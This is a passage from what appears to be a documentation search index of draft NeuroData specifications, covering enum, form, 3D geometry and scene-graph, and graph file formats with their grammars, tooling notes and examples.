</ul>"},{"location":"NeuroData/enum/#4-syntax-format-definition","title":"4. Syntax / Format Definition","text":"<p>An <code>.ndenum</code> file consists of: 1.  Optional file-level metadata lines (<code>:: key: value</code>). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  One or more <code>VALUE</code> definition blocks.</p>"},{"location":"NeuroData/enum/#41-file-level-metadata","title":"4.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines at the beginning of the file. Recommended metadata includes: * <code>:: type: EnumDefinition</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required, version of this enum definition content) * <code>:: id: &lt;unique_enum_id&gt;</code> (Required if this enum will be referenced from elsewhere) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/enum/#42-enum-member-definition-value","title":"4.2 Enum Member Definition (<code>VALUE</code>)","text":"<p>Each member of the enumeration is defined by a block starting with <code>VALUE</code>.</p> <ul> <li>Format:     <pre><code>VALUE \"&lt;keyword_string&gt;\"\n  # Optional indented attribute lines\n  [LABEL \"&lt;display_text&gt;\"]\n  [DESC \"&lt;description_text&gt;\"]\n  [NUMERIC &lt;number_literal&gt;]\n# Optional attached data block\n[DATA ```&lt;format_tag&gt;\n... data content ...\n```]\n</code></pre></li> <li><code>VALUE \"&lt;keyword_string&gt;\"</code>: Starts the definition. The <code>&lt;keyword_string&gt;</code> is the required, unique identifier for this enum member within the file (e.g., <code>\"pending\"</code>, <code>\"active\"</code>). It must be a valid string literal.</li> <li>Indentation: Attribute lines (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>) and the <code>DATA</code> block fence MUST be indented relative to the <code>VALUE</code> line. Consistent indentation (e.g., 2 or 4 spaces) is recommended.</li> </ul>"},{"location":"NeuroData/enum/#43-optional-attributes","title":"4.3 Optional Attributes","text":"<p>These attributes are defined on lines indented relative to the <code>VALUE</code> line:</p> <ul> <li><code>LABEL \"&lt;display_text&gt;\"</code>: (Optional) A string literal providing a human-friendly label for the enum member. If omitted, tools should default to using the <code>&lt;keyword_string&gt;</code> from the <code>VALUE</code> line.</li> <li><code>DESC \"&lt;description_text&gt;\"</code>: (Optional) A string literal providing a detailed description of the enum member's meaning or usage.</li> <li><code>NUMERIC &lt;number_literal&gt;</code>: (Optional) Associates a numeric value (integer or float) with the enum member. The <code>&lt;number_literal&gt;</code> should be a valid NeuroScript number (e.g., <code>1</code>, <code>-10</code>, <code>3.14</code>).</li> </ul>"},{"location":"NeuroData/enum/#44-attached-data-block-data","title":"4.4 Attached Data Block (<code>DATA</code>)","text":"<ul> <li>(Optional) Immediately following the <code>VALUE</code> line and its indented attribute lines, an optional standard fenced data block can be attached using the <code>DATA</code> keyword on the line before the opening fence.</li> <li>Format:     <pre><code>VALUE \"...\"\n  ... attributes ...\nDATA ```&lt;format_tag&gt;\n{ \"structured\": \"data\", \"value\": 123 }\n</code></pre>     ```</li> <li>The <code>&lt;format_tag&gt;</code> (e.g., <code>json</code>, <code>yaml</code>) indicates the format of the content within the block.</li> <li>This block allows associating arbitrary structured data with an enum member.</li> </ul>"},{"location":"NeuroData/enum/#5-ebnf-grammar-draft","title":"5. EBNF Grammar (Draft)","text":"<p><pre><code>enum_file         ::= { metadata_line | comment_line | blank_line } { value_definition_block } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per metadata spec *)\n\nvalue_definition_block ::= value_line { attribute_line } [ data_block ] ;\n\nvalue_line        ::= optional_whitespace \"VALUE\" whitespace string_literal newline ;\n\nattribute_line    ::= indentation (\"LABEL\"|\"DESC\"|\"NUMERIC\") whitespace attribute_value newline ;\nindentation       ::= whitespace+ ;\nattribute_value   ::= string_literal | number_literal ; (* Value type depends on keyword *)\n\ndata_block        ::= indentation \"DATA\" whitespace fenced_block ;\nfenced_block      ::= \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\n(* Define: string_literal, number_literal, key, value, whitespace, newline, comment_line, blank_line, language_tag, text_line, optional_whitespace *)\n</code></pre> (Note: This EBNF needs refinement, especially regarding indentation parsing)</p>"},{"location":"NeuroData/enum/#6-tooling-requirements-interaction","title":"6. Tooling Requirements / Interaction","text":"<ul> <li>Parsing: Tools need to parse the file structure, recognizing <code>VALUE</code> blocks and their indented attributes (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>). They must also handle the optional attached <code>DATA</code> block, potentially parsing its content based on the format tag (e.g., using a JSON parser if ```json).</li> <li>Validation: Tools consuming <code>.ndenum</code> references (e.g., in <code>.ndtable</code> or <code>.ndform</code> schemas) should validate that provided values match one of the defined <code>&lt;keyword_string&gt;</code> values in the referenced <code>.ndenum</code> file.</li> <li>Lookup: Tools might provide functions to look up associated data (label, description, numeric value, data block content) based on a given keyword string.</li> <li>UI Generation: The <code>LABEL</code> and <code>DESC</code> attributes can be used by tools to generate more user-friendly interfaces (e.g., dropdown lists with descriptions in forms).</li> <li>Formatting (<code>TOOL.fmt</code>): A formatter should ensure consistent indentation and spacing.</li> </ul>"},{"location":"NeuroData/form/","title":"NeuroData Form Format (.ndform) Specification","text":"<p>:: type: FormFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/table.md, docs/neurodata_and_composite_file_spec.md, pkg/neurodata/blocks/blocks_extractor.go :: howToUpdate: Refine field attributes, types, validation rules, EBNF, NS fragment scope/allowlist, examples. Define .ndobj format.</p>"},{"location":"NeuroData/form/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Forms (<code>.ndform</code>) define the structure, presentation, validation rules, and associated metadata for a data entry form. They act as a schema or template for data capture. The <code>.ndform</code> file itself does not contain the filled-in instance data, but rather describes the fields and their properties. It aims to be human-readable while providing enough structure for tools and AI to render, validate, and process form instances.</p>"},{"location":"NeuroData/form/#2-relation-to-form-data-ndobj","title":"2. Relation to Form Data (<code>.ndobj</code>)","text":"<p>The <code>.ndform</code> file defines the schema of the form. The actual data entered into an instance of the form should be stored separately, potentially using a simple key-value format designated <code>.ndobj</code> (NeuroData Object).</p> <p>An <code>.ndobj</code> instance should reference the <code>.ndform</code> it corresponds to via metadata (e.g., <code>:: formRef: [ref:path/to/form.ndform#form-id]</code>).</p> <p>It is expected that <code>.ndform</code> definitions and <code>.ndobj</code> data instances will often be bundled together within composite documents (e.g., Markdown files), identifiable via <code>:: type: Form</code> and <code>:: type: Object</code> (or similar) metadata and extracted using block processing tools [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p>"},{"location":"NeuroData/form/#3-syntax-ndform","title":"3. Syntax (<code>.ndform</code>)","text":"<p>An <code>.ndform</code> file or block consists of: 1.  File/Block-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Field Definitions: A series of field definitions describing the form structure. 3.  Comments/Blank Lines: Allowed between metadata and fields, and between fields.</p>"},{"location":"NeuroData/form/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines. Recommended metadata includes: * <code>:: type: Form</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_form_id&gt;</code> (Required if referenced) * <code>:: title: \"&lt;Form Title&gt;\"</code> (Optional, human-readable title) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/form/#32-field-definition","title":"3.2 Field Definition","text":"<p>Each field is defined using a <code>FIELD</code> line followed by indented attribute lines: * <code>FIELD &lt;field_id&gt;</code>: Starts the definition. <code>&lt;field_id&gt;</code> must be a unique identifier within the form (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). * Attribute Lines (Indentation optional but recommended for readability): Define properties using keywords followed by their value. Common attributes include:     * <code>LABEL \"&lt;text&gt;\"</code>: The human-readable label or question for the field.     * <code>TYPE &lt;type_spec&gt;</code>: Data type. Supported types: <code>string</code>, <code>text</code> (multi-line string), <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>email</code>, <code>url</code>, <code>block_ref</code>, <code>enum(\"val1\", \"val2\")</code>.     * <code>VALUE &lt;literal | template_var | block&gt;</code>: The default or current value. For multi-line text, use a nested fenced block (see 3.3). May contain template variables (<code>{{...}}</code>) if the form is processed by a templating engine.     * <code>HELP &lt;text | block&gt;</code>: Explanatory text for the user. For multi-line help, use a nested fenced block (see 3.3).     * <code>VALIDATION &lt;rules...&gt;</code>: Space-separated standard validation rules (see Section 3.4).     * <code>DEFAULT &lt;value&gt;</code>: Default value (static literal or <code>NOW</code> for timestamp).     * <code>READONLY &lt;true|false&gt;</code>: Indicates if the field value can be edited.     * <code>VISIBLE &lt;true|false&gt;</code>: Indicates if the field should be initially visible.     * (Future attributes for NS fragments: <code>VALIDATE_NS</code>, <code>DEFAULT_NS</code>, <code>CALCULATE_NS</code>, <code>READONLY_NS</code>, <code>VISIBLE_NS</code> - see Section 4). * Attached Blocks: A standard fenced block (<code>```...```</code>) placed immediately after all attribute lines for a <code>FIELD</code> is considered attached to that field (e.g., for complex properties via <code>TYPE: block_ref</code> or just providing context).</p>"},{"location":"NeuroData/form/#33-multi-line-values-value-help","title":"3.3 Multi-line Values (VALUE, HELP)","text":"<p>To define multi-line text for <code>VALUE</code> or <code>HELP</code> attributes, use a nested fenced block immediately following the attribute line: <pre><code>FIELD notes\n  LABEL \"Additional Notes\"\n  TYPE text\n  VALUE ```text\nLine 1 of the value.\nLine 2 of the value.\n</code></pre>   HELP ```markdown Please provide any relevant details. * Use bullet points if needed. * Markdown is supported here. <pre><code>\n</code></pre></p>"},{"location":"NeuroData/form/#34-standard-validation-rules","title":"3.4 Standard Validation Rules","text":"<p>Similar to <code>.ndtable</code>: * <code>NOT NULL</code>: Field must have a non-empty value. * <code>UNIQUE</code>: (Context-dependent) Value should be unique relative to other instances processed together. * <code>REGEX(\"pattern\")</code>: String value must match the Go regex pattern. * <code>MIN(value)</code> / <code>MAX(value)</code>: For numeric/timestamp types.</p>"},{"location":"NeuroData/form/#4-neuroscript-fragment-integration-future-v010","title":"4. NeuroScript Fragment Integration (Future v0.1.0+)","text":"<p>(Note: The following attributes are planned features and not part of the v0.1.0 specification.)</p> <p>Future versions may allow embedding restricted NeuroScript expressions for dynamic behavior: * <code>VALIDATE_NS \"&lt;expression&gt;\"</code>: Expression must evaluate to true for the field value (using <code>{{value}}</code>) to be valid. * <code>DEFAULT_NS \"&lt;expression&gt;\"</code>: Expression result provides the default value. * <code>CALCULATE_NS \"&lt;expression&gt;\"</code>: Field value is dynamically calculated (e.g., <code>CALCULATE_NS(\"'{{row.first}}'+' '+'{{row.last}}'\"</code>). * <code>READONLY_NS \"&lt;expression&gt;\"</code>: Field is readonly if the expression evaluates to true. * <code>VISIBLE_NS \"&lt;expression&gt;\"</code>: Field is visible if the expression evaluates to true.</p> <p>Execution Context: These NS fragments would execute in a highly restricted sandbox: * Scope: Access only to the current form instance data (e.g., via <code>data.field_id</code> or <code>row.field_id</code> for calculated fields) and the specific field's value (<code>value</code>). No access to global interpreter state or <code>LAST</code>. * Allowlist: A minimal allowlist of safe, pure functions/operators (basic math, string manipulation, boolean logic). No I/O (<code>ReadFile</code>, <code>WriteFile</code>), no <code>ExecuteCommand</code>, no <code>CALL LLM</code>, etc.</p>"},{"location":"NeuroData/form/#5-ebnf-grammar-draft","title":"5. EBNF Grammar (Draft)","text":"<pre><code>form_file         ::= { metadata_line | comment_line | blank_line } { field_definition } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per references spec *)\n\nfield_definition  ::= optional_whitespace \"FIELD\" whitespace field_id newline { field_attribute_line } [ fenced_block ] ;\nfield_id          ::= identifier ;\n\nfield_attribute_line ::= indentation attribute_keyword whitespace attribute_value newline | multi_line_attribute ;\n\nattribute_keyword ::= \"LABEL\" | \"TYPE\" | \"VALUE\" | \"HELP\" | \"VALIDATION\" | \"DEFAULT\" | \"READONLY\" | \"VISIBLE\" | \"VALIDATE_NS\" | \"DEFAULT_NS\" | \"CALCULATE_NS\" | \"READONLY_NS\" | \"VISIBLE_NS\" ; (* NS ones are future *)\nattribute_value   ::= rest_of_line ; (* Specific parsing depends on keyword, includes literals, type specs, validation rules etc. *)\n\nmulti_line_attribute ::= indentation (\"VALUE\" | \"HELP\") whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\nfenced_block      ::= optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\n(* Define: identifier, key, value, rest_of_line, type_spec, validation_rules, language_tag, text_line etc. *)\n</code></pre>"},{"location":"NeuroData/form/#6-tool-interaction","title":"6. Tool Interaction","text":"<p>Tools would interact with forms: * Rendering: A tool could take an <code>.ndform</code> definition and an optional <code>.ndobj</code> data instance to render an interactive form (e.g., in a terminal UI or web page). * Validation: <code>TOOL.ValidateFormData(form_ref, data_obj)</code> could validate the data in an <code>.ndobj</code> against the rules in its corresponding <code>.ndform</code>. * Extraction: <code>TOOL.ExtractFormData(form_ref)</code> could perhaps prompt a user to fill a form and return the resulting <code>.ndobj</code>. * Templating: <code>TOOL.RenderTemplate</code> could potentially use form data (<code>.ndobj</code>) as input.</p>"},{"location":"NeuroData/form/#7-example-ndform","title":"7. Example <code>.ndform</code>","text":"<pre><code>:: type: Form\n:: version: 0.1.0\n:: id: bug-report-form\n:: title: \"Bug Report\"\n\nFIELD report_id\n  LABEL \"Report ID\"\n  TYPE string\n  DEFAULT_NS \"CALL TOOL.GenerateUUID()\" # Future example\n  READONLY true\n  HELP \"Unique identifier for this report.\"\n\nFIELD summary\n  LABEL \"Summary\"\n  TYPE string\n  VALIDATION NOT NULL\n  HELP \"Provide a one-line summary of the issue.\"\n\nFIELD component\n  LABEL \"Component\"\n  TYPE enum(\"Core Interpreter\", \"Tooling\", \"Agent Mode\", \"NeuroData\", \"Other\")\n  DEFAULT \"Core Interpreter\"\n\nFIELD steps_to_reproduce\n  LABEL \"Steps to Reproduce\"\n  TYPE text\n  VALIDATION NOT NULL\n  HELP ```markdown\nPlease list the exact steps needed to trigger the bug.\n1. Step one...\n2. Step two...\n3. ...\n</code></pre> <p>FIELD logs # Example attaching a block for context/reference   LABEL \"Relevant Logs (Optional)\"   TYPE block_ref # Value would be a [ref:...] or empty   HELP \"Attach relevant log output below or reference a block ID.\" <pre><code>:: id: sample-log-format\nPaste logs here...\n</code></pre></p> <p>FIELD severity   LABEL \"Severity (1-5)\"   TYPE int   DEFAULT 3   VALIDATION NOT NULL VALIDATE_NS(\"{{value}} &gt;= 1 AND {{value}} &lt;= 5\") # Future Example</p>"},{"location":"NeuroData/geometry/","title":"NeuroData Geometry &amp; Scene Formats Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/symbolic_math.md, docs/neurodata/tree.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine attributes and syntax for each format, specify coordinate systems/units conventions, detail tool requirements.</p>"},{"location":"NeuroData/geometry/#1-purpose","title":"1. Purpose","text":"<p>This document defines a set of NeuroData formats for representing 3D geometry and scene structures: * Polygon Meshes (<code>.ndmesh</code>): Explicit representation using vertices and faces. * Constructive Solid Geometry (<code>.ndcsg</code>): Implicit representation using boolean operations on primitive shapes. * Signed Distance Fields (<code>.ndsdf</code>): Implicit representation using a distance function. * Scene Graphs (<code>.ndscenegraph</code>): Hierarchical structure for organizing transformations, geometry, lights, and cameras.</p> <p>These formats aim to provide structured, human-readable (where practical) representations suitable for use within the NeuroScript ecosystem, primarily intended for manipulation and rendering by dedicated tools.</p>"},{"location":"NeuroData/geometry/#2-common-elements","title":"2. Common Elements","text":"<ul> <li>Metadata: Each format uses standard <code>:: key: value</code> metadata [cite: uploaded:neuroscript/docs/metadata.md], including <code>:: type: &lt;TypeName&gt;</code>, <code>:: version:</code>, and potentially <code>:: id:</code>, <code>:: description:</code>.</li> <li>Units &amp; Coordinate System: A convention should be established (e.g., default to millimeters, right-handed Y-up coordinate system) or specified via metadata (e.g., <code>:: units: mm</code>, <code>:: coords: RHS_Y_UP</code>). This is crucial for interoperability.</li> <li>References: Standard NeuroScript references (<code>[ref:&lt;location&gt;[#&lt;block_id&gt;]]</code> [cite: generated previously in <code>docs/references.md</code>]) are used extensively, especially in Scene Graphs, to link nodes to geometry, materials, lights, cameras, etc.</li> <li>Data Representation: Large datasets (like mesh vertices) might be stored line-by-line or within fenced blocks. Functional representations (<code>.ndcsg</code>, <code>.ndsdf</code>) use fenced blocks. Scene graphs use indentation and tagged attribute lines.</li> </ul>"},{"location":"NeuroData/geometry/#3-format-specifications","title":"3. Format Specifications","text":""},{"location":"NeuroData/geometry/#31-polygon-mesh-ndmesh","title":"3.1 Polygon Mesh (<code>.ndmesh</code>)","text":"<ul> <li>Purpose: Represents geometry as a collection of vertices and polygons (faces).</li> <li><code>:: type: Mesh</code></li> <li>Structure: Typically uses tagged lines or sections for vertices and faces.</li> <li>Attributes/Sections:<ul> <li><code>VERTEX &lt;x&gt; &lt;y&gt; &lt;z&gt;</code>: Defines a vertex. Coordinates are floats.</li> <li><code>FACE &lt;idx1&gt; &lt;idx2&gt; &lt;idx3&gt; [&lt;idx4&gt;...]</code>: Defines a polygon face using 1-based indices into the vertex list. Supports triangles, quads, or n-gons (tool support may vary).</li> <li><code>NORMAL &lt;nx&gt; &lt;ny&gt; &lt;nz&gt;</code>: (Optional) Defines a vertex normal. Usually listed in the same order as vertices.</li> <li><code>UV &lt;u v&gt;</code>: (Optional) Defines a texture coordinate. Usually listed in the same order as vertices.</li> <li>(Alternative: Vertex, Face, Normal, UV data could be placed within fenced blocks, e.g., <code>csv ...</code> or <code>json ...</code>, for large meshes).</li> </ul> </li> <li>Example: <pre><code>:: type: Mesh\n:: version: 0.1.0\n:: id: simple-cube-mesh\n\nVERTEX 0 0 0; VERTEX 1 0 0; VERTEX 1 1 0; VERTEX 0 1 0\nVERTEX 0 0 1; VERTEX 1 0 1; VERTEX 1 1 1; VERTEX 0 1 1\n\nFACE 1 2 3 4; FACE 5 6 7 8; FACE 1 2 6 5\nFACE 2 3 7 6; FACE 3 4 8 7; FACE 4 1 5 8\n</code></pre></li> </ul>"},{"location":"NeuroData/geometry/#32-constructive-solid-geometry-ndcsg","title":"3.2 Constructive Solid Geometry (<code>.ndcsg</code>)","text":"<ul> <li>Purpose: Represents shapes by combining primitive solids using boolean operations.</li> <li><code>:: type: CSG</code></li> <li>Structure: A tree of operations and primitives, represented using Functional Notation (similar to <code>.ndmath</code>) within a fenced block.</li> <li>Syntax: Defines functions for primitives, operations, and transformations.<ul> <li>Primitives: <code>Sphere(radius)</code>, <code>Cube(size | Vector(sx, sy, sz))</code>, <code>Cylinder(radius, height)</code>...</li> <li>Operations: <code>Union(obj1, obj2, ...)</code>, <code>Difference(obj1, obj2, ...)</code>, <code>Intersection(obj1, obj2, ...)</code></li> <li>Transformations: <code>Translate(Vector(tx, ty, tz), obj)</code>, <code>Rotate(Vector(ax, ay, az), angle_degrees, obj)</code>, <code>Scale(Vector(sx, sy, sz), obj)</code></li> <li>Helper: <code>Vector(x, y, z)</code></li> </ul> </li> <li>Example: <pre><code>:: type: CSG\n:: version: 0.1.0\n:: id: csg-example\n\n```funcgeom\nDifference(\n  Cube(size=20), # Assuming centered cube if Vector not used\n  Sphere(radius=13)\n)\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/geometry/#33-signed-distance-field-ndsdf","title":"3.3 Signed Distance Field (<code>.ndsdf</code>)","text":"<ul> <li>Purpose: Represents shapes implicitly via a function <code>f(x, y, z)</code> yielding the shortest signed distance to the surface.</li> <li><code>:: type: SDF</code></li> <li>Structure: The core is a mathematical expression defining the distance function. Uses the <code>.ndmath</code> Functional Notation.</li> <li>Syntax: Contains a fenced block storing the <code>.ndmath</code> expression.</li> <li>Example: <pre><code>:: type: SDF\n:: version: 0.1.0\n:: id: sphere-sdf-example\n\n```funcmath\n# Defines f(x, y, z) = length(Vector(x,y,z)) - radius\nSubtract( Length(Vector(x, y, z)), 5.0 )\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/geometry/#34-scene-graph-ndscenegraph","title":"3.4 Scene Graph (<code>.ndscenegraph</code>)","text":"<ul> <li>Purpose: Represents a hierarchical structure of nodes containing transformations, references to content (geometry, lights, cameras), materials, and potentially grouping other nodes.</li> <li><code>:: type: SceneGraph</code></li> <li>Structure: Uses an indentation-based tree structure (like <code>.ndtree</code>). Each node is defined by <code>NODE &lt;node_id&gt;</code> followed by indented tagged attribute lines (like <code>.ndform</code>).</li> <li>Node Attributes:<ul> <li><code>LABEL \"&lt;friendly_name&gt;\"</code>: (Optional) Human-readable name.</li> <li><code>TRANSFORM &lt;transform_definition&gt;</code>: Node's transformation relative to parent. Uses Functional Notation (e.g., <code>Translate(...) Rotate(...) Scale(...)</code>).</li> <li><code>CONTENT_REF \"[ref:&lt;location&gt;#&lt;content_id&gt;]\"</code>: Reference to <code>.ndmesh</code>, <code>.ndcsg</code>, <code>.ndsdf</code>, <code>.ndlight</code>, <code>.ndcamera</code>, etc.</li> <li><code>MATERIAL_REF \"[ref:&lt;material_id&gt;]\"</code>: (Optional) Reference to a material definition (presumed <code>.ndmat</code> format).</li> <li><code>PROPERTY &lt;key&gt; &lt;value&gt;</code>: (Optional) Custom user data.</li> </ul> </li> <li>Example: <pre><code>:: type: SceneGraph\n:: version: 0.1.0\n:: id: simple-scene\n\nNODE root\n  NODE object1\n    LABEL \"Translated Cube\"\n    TRANSFORM Translate(5, 0, 0)\n    CONTENT_REF \"[ref:this#simple-cube-mesh]\" # Refers to mesh defined elsewhere in same composite doc\n  NODE object2\n    LABEL \"Rotated Sphere Group\"\n    TRANSFORM Rotate(0, 1, 0, 45)\n    NODE sphere_visual # Child node\n      LABEL \"Actual Sphere\"\n      CONTENT_REF \"[ref:geometry/primitives.ndsdf#unit-sphere]\" # Refers to SDF in another file\n      MATERIAL_REF \"[ref:materials.ndmat#blue_plastic]\"\n  NODE main_camera\n    TRANSFORM Translate(0, 10, 20) LookAt(0, 0, 0)\n    CONTENT_REF \"[ref:cameras.ndcamera#default]\"\n</code></pre></li> </ul>"},{"location":"NeuroData/geometry/#5-tooling-requirements","title":"5. Tooling Requirements","text":"<p>Using these geometry and scene formats requires a significant suite of new NeuroScript tools, likely wrapping external geometry processing, CAS, and/or rendering libraries: * Parsing Tools: <code>TOOL.ParseMesh</code>, <code>TOOL.ParseCSG</code>, <code>TOOL.ParseSDF</code> (using <code>TOOL.MathFromFunctional</code>), <code>TOOL.ParseSceneGraph</code>. * Evaluation/Processing Tools:     * <code>TOOL.EvaluateCSG</code> -&gt; <code>.ndmesh</code> (Convert CSG to mesh).     * <code>TOOL.MeshFromSDF</code> -&gt; <code>.ndmesh</code> (e.g., Marching Cubes).     * <code>TOOL.EvaluateSDF(sdf_ref, x, y, z)</code> -&gt; <code>distance</code>.     * <code>TOOL.ProcessSceneGraph</code> (e.g., flatten transforms, collect renderable objects).     * <code>TOOL.MeshBoolean(mesh_a, mesh_b, operation)</code>     * <code>TOOL.SimplifyMesh</code>, <code>TOOL.ValidateMesh</code>, <code>TOOL.CalculateMeshVolume</code>, etc. * Rendering Tools: <code>TOOL.RenderSceneGraph(scene_ref, camera_ref)</code> -&gt; <code>image_data</code> (Could be complex, potentially invoking external renderers). * Conversion Tools: <code>TOOL.ExportMesh(mesh_ref, format)</code> (e.g., format=\"stl\", \"obj\").</p>"},{"location":"NeuroData/graph/","title":"NeuroData Graph Format (.ndgraph) Specification","text":"<p>:: type: GraphFormatSpec :: version: 0.1.1 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review decisions, update EBNF, ensure examples match spec.</p>"},{"location":"NeuroData/graph/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Graphs (<code>.ndgraph</code>) provide a simple, human-readable plain-text format for representing node-edge graph structures. The format prioritizes human readability while being machine-parseable. It is designed primarily to be read by humans and updated by tools or AI, supporting explicit bidirectional link representation for clarity.</p>"},{"location":"NeuroData/graph/#2-syntax","title":"2. Syntax","text":"<p>A <code>.ndgraph</code> file consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of <code>NODE</code> definitions. 4.  Each <code>NODE</code> definition can be followed by:     a. An optional attached fenced data block (for complex properties).     b. Indented <code>EDGE</code> definitions representing connections (outgoing, incoming, or undirected) associated with that node.</p>"},{"location":"NeuroData/graph/#21-file-level-metadata","title":"2.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines at the very beginning of the file. Recommended metadata includes: * <code>:: type: Graph</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_graph_id&gt;</code> (Optional but recommended) * <code>:: directed: &lt;true|false&gt;</code> (Optional, defaults to true. Affects edge interpretation.) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/graph/#22-node-definition-line","title":"2.2 Node Definition Line","text":"<ul> <li>Format: <code>NODE NodeID [Optional Simple Properties]</code></li> <li><code>NODE</code>: Keyword indicating a node definition.</li> <li><code>NodeID</code>: A unique identifier for the node within the graph. Must start with a letter or underscore, followed by letters, numbers, or underscores (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). IDs are case-sensitive.</li> <li><code>[Optional Simple Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the node (see Section 2.4). Complex properties should use an Attached Data Block (see Section 2.5).</li> </ul>"},{"location":"NeuroData/graph/#23-edge-definition-lines","title":"2.3 Edge Definition Lines","text":"<ul> <li>Format: <code>Indentation EdgeMarker TargetNodeID [Optional Simple Properties]</code></li> <li>Indentation: One or more spaces or tabs MUST precede the edge marker. This indicates the edge belongs to the preceding <code>NODE</code> definition.</li> <li>EdgeMarker:<ul> <li><code>-&gt;</code>: Indicates an outgoing directed edge from the parent <code>NODE</code> to the <code>TargetNodeID</code>.</li> <li><code>&lt;-</code>: Indicates an incoming directed edge from the <code>TargetNodeID</code> to the parent <code>NODE</code>.</li> <li><code>--</code>: Indicates an undirected edge between the parent <code>NODE</code> and the <code>TargetNodeID</code>.</li> </ul> </li> <li><code>TargetNodeID</code>: The ID of the node the edge connects to (or originates from, for <code>&lt;-</code>). Must be a valid <code>NodeID</code>.</li> <li><code>[Optional Simple Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the edge (see Section 2.4). Complex edge properties are discouraged; consider representing complex edge data as a separate node if necessary.</li> </ul> <p>Consistency Requirement: For every explicitly listed directed edge (e.g., <code>A -&gt; B [prop]</code>), the corresponding reverse edge (<code>B &lt;- A [prop]</code>) SHOULD also be listed under the target node's definition. For every undirected edge (<code>A -- B [prop]</code>), the corresponding edge (<code>B -- A [prop]</code>) SHOULD also be listed. A formatting tool (<code>ndgraphfmt</code>) should be used to enforce this consistency.</p>"},{"location":"NeuroData/graph/#24-simple-property-definitions-inline","title":"2.4 Simple Property Definitions (Inline)","text":"<p>Simple properties can be included directly within square brackets <code>[]</code> on the <code>NODE</code> or <code>EDGE</code> line. This is suitable for labels, weights, statuses, etc. * Format: <code>[key1: value1, key2: value2, ...]</code> * Enclosed in square brackets <code>[]</code>. * Consists of one or more comma-separated <code>key: value</code> pairs. * <code>key</code>: A simple identifier (letters, numbers, underscore, hyphen). * <code>value</code>: Can be:     * A number (<code>123</code>, <code>4.5</code>, <code>-10</code>).     * A boolean (<code>true</code>, <code>false</code>).     * A quoted string (<code>\"like this\"</code>, <code>'or this'</code>). Allows standard escapes.     * An unquoted simple string (no spaces or special characters like <code>[]:,\"</code>).</p>"},{"location":"NeuroData/graph/#25-complex-properties-attached-data-block","title":"2.5 Complex Properties (Attached Data Block)","text":"<p>For nodes requiring complex or extensive properties (e.g., nested data, lists, multi-line text), a standard fenced data block (like JSON or YAML) can be placed immediately following the <code>NODE</code> definition line it applies to. * The block should use standard <code>syntax, optionally specifying the data format (e.g.,</code>json). * Tools parsing the <code>.ndgraph</code> file should associate the content of this block with the immediately preceding <code>NODE</code>. * This leverages existing block extraction mechanisms [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p> <p>Example: <pre><code>NODE N3 [label: \"Node with Data Block\"]\n```json\n{\n  \"description\": \"Uses JSON.\",\n  \"config\": {\"attempts\": 3}\n}\n</code></pre>   # Edges for N3 would follow here   -&gt; N4 NODE N4 ... <pre><code>### 2.6 Comments and Blank Lines\n\nLines starting with `#` or `--` (after optional whitespace) are comments and are ignored. Blank lines are also ignored.\n\n## 3. EBNF Grammar (Draft)\n\n(* EBNF reflecting attached data block *)\n```ebnf\ngraph_file        ::= { metadata_line | comment_line | blank_line } { node_definition_block } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\nkey               ::= identifier ;\nvalue             ::= rest_of_line ;\n\nnode_definition_block ::= node_definition_line [ fenced_data_block ] { edge_definition } ;\n\nnode_definition_line  ::= optional_whitespace \"NODE\" whitespace node_id [ whitespace simple_property_block ] newline ;\nnode_id           ::= identifier ;\n\nedge_definition   ::= indentation edge_marker whitespace node_id [ whitespace simple_property_block ] newline ;\nindentation       ::= whitespace+ ;\nedge_marker       ::= \"-&gt;\" | \"&lt;-\" | \"--\" ;\n\nsimple_property_block ::= \"[\" property_list \"]\" ;\nproperty_list     ::= property_entry { \",\" property_entry } ;\nproperty_entry    ::= optional_whitespace key optional_whitespace \":\" optional_whitespace property_value optional_whitespace ;\nproperty_value    ::= number_literal | boolean_literal | string_literal | simple_string ;\n\nfenced_data_block ::= 